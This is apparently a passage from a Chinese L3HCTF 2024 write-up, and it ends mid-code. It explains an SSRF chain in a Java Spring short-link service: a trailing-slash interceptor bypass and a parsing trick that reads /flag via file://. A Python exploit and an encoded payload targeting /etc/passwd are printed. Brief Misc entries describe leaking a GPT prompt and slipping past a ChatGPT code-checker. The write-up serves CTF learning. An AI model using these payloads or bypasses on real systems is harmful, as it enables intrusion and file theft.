<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> redirect<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token class-name">CacheMap</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>redirect<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> url <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">NOT_FOUND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"url not found"</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ResponseEntity<span class="token punctuation">.</span>BodyBuilder</span><span class="token punctuation">)</span><span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">FOUND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">location</span><span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x2F;share 路由即生成短链接的路由，只支持http协议，测试貌似不出网</p>
<p>&#x2F;jump 路由即缓存对应链接的内容，传入对应的 redirect 参数就返回对应的资源</p>
<p>MyIntercepter.class</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyIntercepter</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">public</span> <span class="token class-name">MyIntercepter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/private"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
         response<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">418</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对<code>/private</code>和<code>/test</code>路由进行了拦截</p>
<p>SpringWebMvcConfigurer.class</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringWebMvcConfigurer</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurationSupport</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">MyIntercepter</span> myIntercepter<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">SpringWebMvcConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>myIntercepter<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configurePathMatch</span><span class="token punctuation">(</span><span class="token class-name">PathMatchConfigurer</span> configurer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        configurer<span class="token punctuation">.</span><span class="token function">setUseTrailingSlashMatch</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"classpath:/static/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">addResourceHandlers</span><span class="token punctuation">(</span>registry<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意到这里<code>configurer.setUseTrailingSlashMatch(true)</code>，意思是<strong>在匹配路径时考虑路径末尾的斜杠</strong>，即我们可以用<code>/private/</code>和<code>/test/</code>绕过前面的拦截（测试发现浏览器访问<code>/test;</code>也可以绕过，应该是被浏览器解析成了<code>/</code>）</p>
<p>TempTest.class</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span>
<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TempTest</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;website.BaseURL&#125;"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token class-name">BaseURL</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">TempTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">Fetch</span><span class="token punctuation">(</span><span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> result <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">URL</span> new_url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">URLConnection</span> urlConnection <span class="token operator">=</span> new_url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            urlConnection<span class="token punctuation">.</span><span class="token function">setConnectTimeout</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            urlConnection<span class="token punctuation">.</span><span class="token function">setReadTimeout</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>urlConnection<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> redirect<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token class-name">CacheMap</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>redirect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string">"url not found"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">UriComponents</span> uri <span class="token operator">=</span> <span class="token class-name">UriComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromUriString</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> paramUrl <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>uri<span class="token punctuation">.</span><span class="token function">getQueryParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFirst</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>paramUrl <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">UriComponents</span> newUri <span class="token operator">=</span> <span class="token class-name">UriComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromUriString</span><span class="token punctuation">(</span>paramUrl<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">String</span> newHost <span class="token operator">=</span> newUri<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>newHost <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span>newHost<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>BaseURL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token string">"url is invalid"</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/private"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">privateTest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> ip <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRemoteAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"not allowed"</span> <span class="token operator">:</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x2F;test 路由接收 redirect 参数，</p>
<p>然后检验传入的 redirect 是否在短链接的map里面，url参数由解析短链接得到，即url为原始链接，</p>
<p>经过<code>UriComponentsBuilder</code>类的解析处理（url的解析可以参考<a href="https://c1oudfl0w0.github.io/blog/2023/05/13/ctfshow%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98parse-url-%E4%B8%93%E5%9C%BA/#parse-url%E5%87%BD%E6%95%B0">php的parse_url</a>），读取其中第一个参数<code>url</code>的内容为<code>paramUrl</code></p>
<p>接下来检测<code>paramUrl</code>的host部分是否为<code>BaseURL</code>的值，而<code>BaseURL</code>是在application.properties里面注解起来的：</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">website.BaseURL</span><span class="token punctuation">=</span><span class="token value attr-value">www.example.com</span>
<span class="token key attr-name">website.RedirectURL</span><span class="token punctuation">=</span><span class="token value attr-value">http://www.example.com/jump?redirect=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>即host部分要为<code>www.example.com</code></p>
<p>最后会调用<code>Fetch</code>方法进行访问</p>
<p>&#x2F;private 路由要求127.0.0.1，然后也是调用<code>Fetch</code>访问资源，不过这里没有加任何限制，可以确定是要ssrf到&#x2F;private路由了</p>
<p>整理下思路：</p>
<p>要想在 &#x2F;test 路由下ssrf到 &#x2F;private 读取文件，需要满足下面几点</p>
<ol>
<li>传入 &#x2F;share 路由生成的短链接</li>
<li>原始链接中需要有<code>url</code>参数</li>
<li>url参数里面需要让<code>www.example.com</code>在host的位置</li>
<li>最后会访问短链接对应的完整链接，这个链接为内网访问 &#x2F;private路由<code>http://127.0.0.1:8080/private/</code>，传入的url参数里面要用<code>file://</code>协议：<code>file://</code>协议的解析也和http协议一样，读取文件的部分是host，而在协议中，<code>@</code>后面跟的就是host</li>
</ol>
<p>于是可以构造原始链接：（官方wp）</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/private/?url=file://www.example.com&amp;url=@/flag</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时&#x2F;test 路由的解析如下：</p>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240729231851601.png" alt="image-20240729231851601"></p>
<p>由此绕过限制，然后此时<code>file://</code>实际解析要读取的文件依旧是<code>file:///flag</code>，<code>www.example.com&amp;url=@</code>的部分不影响file协议读取</p>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240729232948619.png" alt="image-20240729232948619"></p>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://localhost:8080/share"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"link"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080/private/?url=file://www.example.com&amp;url=@/flag"</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
url <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>query
redirect_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>parse_qs<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
test_url <span class="token operator">=</span> <span class="token string">"http://localhost:8080/test/?redirect="</span> <span class="token operator">+</span> redirect_url

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>test_url<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>其它的解法：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/private/?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%3f://www.example.com/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>往协议头里面塞，转到 private 的时候会自动过一层 url 解码，变成 <code>Fetch(&quot;file:///etc/passwd?://www.example.com/&quot;);</code>，后面自然是变成了无关的参数，于是可以正常读取</p>
<br>

<p>好像还有302跳转两次解决的？</p>
<br>

<p>拓展思考🤔：<a target="_blank" rel="noopener" href="https://www.oscs1024.com/hd/MPS-uwzo-gx91">CVE-2024-22243</a></p>
<blockquote>
<p>受影响版本中，由于 UriComponentsBuilder 处理URL时未正确过滤用户信息中的方括号 <code>[</code>  ，攻击者可构造包含方括号的恶意URL绕过主机名验证。如果应用程序依赖UriComponentsBuilder.fromUriString()等方法对URL进行解析和校验，则可能导致验证绕过，出现开放重定向或SSRF漏洞。<br>影响版本：<br>libspring-java@影响所有版本<br>org.springframework:spring-web@[6.1.0, 6.1.4)<br>org.springframework:spring-web@[6.0.0, 6.0.17)<br>org.springframework:spring-web@(-∞, 5.3.32)</p>
</blockquote>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240730000007259.png" alt="image-20240730000007259"></p>
<hr>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>GPT提示词注入</p>
<p>直接输tl就爆出来了</p>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240204221302618.png" alt="image-20240204221302618"></p>
<hr>
<h2 id="End-of-Programming"><a href="#End-of-Programming" class="headerlink" title="End_of_Programming"></a>End_of_Programming</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Let’s play ICPC.
请输入prompt，使得ChatGPT可以写出C++代码解决上面的算法问题。请注意，您不可以在prompt里包含任何代码，您的prompt将由ChatGPT检查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>给了源码，是GPT的检查处理逻辑</p>
<p>非预期prompt：其实就是把题目复制过来让gpt用cpp写而已（</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Solve the problem by cpp:
Problem Description
Dr. Dai raises many Pals for his scientific research. As Dr. Dai is a loving person, he prepares food for these Pals every day.
Now we have $a$ Pals that only love to eat meat, $b$ Pals that absolutely do not eat meat, and $c$ Pals that eat anything.
The East-1th student canteen provides $m$ types of dishes and stipulates that each dish can only be bought once. The $i$-th dish has a price $c_i$, and has a character $A$ or $B$, indicating whether it is a vegetarian dish or a meat dish.
Now, Dr. Dai hopes to feed as many Pals as possible and, given the limited research funds, also hopes to minimize the cost under this premise. Please calculate the maximum number of Pals he can feed, and the minimum amount of money he needs to spend in this situation.
Input Format
The first line contains three integers $a$ $b$ $c$
The next line is an integer $m$
The following $m$ lines, each representing the value and category of the food, A for vegetarian, B for meat.
Output Format
Two numbers, representing the number of Pals that can be fed and the total cost, respectively.
Sample #1
Sample Input #1
2 1 1
4
5 A
6 B
3 B
7 B

Sample Output #1
3 14

Tips
For 10% of the data, it is guaranteed that $a=b=0$
For 30% of the data, it is guaranteed that $1 \leq a,b,c \leq 100, 1 \leq m \leq 100$
For 100% of the data, it is guaranteed that $1 \leq a,b,c \leq 10^5, 1 \leq m \leq 3 \times 10^5$
All $c_i \leq 10^9$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>天才！</p>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240204234724108.png" alt="image-20240204234724108"></p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">Dish</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> price<span class="token punctuation">;</span>
    <span class="token keyword">char</span> category<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">bool</span> <span class="token function">compareDish</span><span class="token punctuation">(</span>Dish d1<span class="token punctuation">,</span> Dish d2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> d1<span class="token punctuation">.</span>price <span class="token operator">&lt;</span> d2<span class="token punctuation">.</span>price<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>
    cin <span class="token operator">>></span> a <span class="token operator">>></span> b <span class="token operator">>></span> c<span class="token punctuation">;</span>
    
    <span class="token keyword">int</span> m<span class="token punctuation">;</span>
    cin <span class="token operator">>></span> m<span class="token punctuation">;</span>
    
    vector<span class="token operator">&lt;</span>Dish<span class="token operator">></span> <span class="token function">dishes</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        cin <span class="token operator">>></span> dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price <span class="token operator">>></span> dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>category<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">sort</span><span class="token punctuation">(</span>dishes<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dishes<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> compareDish<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">int</span> maxPals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> minCost <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>category <span class="token operator">==</span> <span class="token char">'A'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                maxPals<span class="token operator">++</span><span class="token punctuation">;</span>
                minCost <span class="token operator">+=</span> dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">;</span>
                a<span class="token operator">--</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                maxPals<span class="token operator">++</span><span class="token punctuation">;</span>
                minCost <span class="token operator">+=</span> dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">;</span>
                c<span class="token operator">--</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
